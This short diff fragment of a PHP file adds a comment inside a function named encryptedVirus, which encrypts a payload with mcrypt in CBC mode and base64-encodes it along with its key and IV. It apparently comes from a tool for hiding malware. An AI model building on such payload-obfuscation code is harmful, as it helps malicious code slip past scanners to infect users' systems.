@@ -44,7 +44,7 @@ function encryptedVirus($virus){
     MCRYPT_MODE_CBC,
     $iv
   );
-
+  //Encode
   $encodedVirus = base64_encode($encryptedVirus);
   $encodedIV = base64_encode($iv);
   $encodedKey = base64_encode($key);
